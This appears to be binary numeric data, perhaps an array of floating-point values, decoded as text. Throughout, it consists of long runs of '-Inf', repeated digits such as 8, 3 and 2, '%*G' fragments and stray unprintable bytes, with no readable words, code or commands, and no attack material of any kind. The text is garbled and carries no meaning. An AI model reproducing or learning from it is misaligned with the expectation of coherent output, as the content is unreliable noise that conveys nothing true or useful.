nf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--Inf222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222-Inf88888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888-I-Inf-Infnf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf�Q       �-Inf88888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888-Inf888888888888888888888888888888888888888888888888888888888888888888888888888-I-Infnfnfnf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--InfInf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--Inf88888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888-Inf8888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888%*G%*G%*G%*G%*G%*G%*G%*G-Inf�-Inf33333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333%*G%*G%*G-Inf*G%*G%*G%*G-Inf�-Inf33333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333%*G%*G%*G-Inf*G%*G%*G%*G-Inf�-Inf88888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888%*G%*G%*G%*G%*G%*G%*G%*G-Inf�-Inf88888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888%*G%*G%*G%*G%*G%*G%*G%*G-Inf�-Inf33333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333%*G%*G%*G-Inf*G%*G%*G%*G-Inf�-Inf33333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333%*G%*G%*G-Inf*G%*G%*G%*G-Inf�-Inf8888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888-Inf888888888888888888888888888888888888888888888888888888888888888888888888888-I-Infnfnfnf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--InfInf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--Inf-Inf-Inf-Inf33333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333-InfInf111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111%*G-Inf-Inf�-Inf888888888888888888888888888888888888888888888888-Inf33333333333-I-Inf-Infnf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--InfInf-\\}�I-Inf333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333-Inf22222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222-Inf22222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222-I-Inf-Infnf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf�P�-Inf8888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888-Inf88888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888-I-Inf-Infnf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--InfInf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--InfInf333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333-Inf88888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888-I-Infnfnfnf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--Inf-Inf-Inf-Inf-Inf-InfInf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-hT�I-Inf888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888-I-Inf-Infnf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--InfInf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf�-Inf3333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333-Inf2222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222-I-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-In-Inf222222222222222222222222222222222-Inf-InfInfnf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--Inf88888888888%-Inf888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888-I-Inf-Infnf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--Inf222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222-I-Inf-Infnf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--Inf-InfۣC�-Inf222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222-Inf222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222-Inf22222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222-I-Inf-Infnf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf�P�-Inf8888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888-Inf88888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888-I-Inf-Infnf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-InfInf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--Inf-Inf\u0026amp;���-Inf22222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222-I-Inf-Infnf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf�(-Inf-Inf-Inf�(-Inf-Infp�-Inf-InfInf-nf-Inf-Inf-Inf-Inf--InfInf-\n-Inf�(-Inf-Inf�թ-Inf��-Inf�P�-Inf-InfInf--Inf�(-Inf-Inf`�j-Inf-Inf-Inf-Inf�(-Inf-Inf-Inf�(-Inf-Inf-Inf�(--InfInf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--InfInf-9-InfP-Inf-Inf�U-InfInf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf22222222l\n-Infq-Inf-Inf�-Infq-Inf-Inf��u-Inf-InfG%*G%*G%*G%*G%*G%*G-Inf�1(-Inf333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333%*G%*G%*G-Inf111111111111�M�1)-Inf333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333%*G%*G%*G-Inf888888888888�-�8*-Inf33333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333�1+-Inf88888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888-Inf888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888-I-Inf-Infnf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf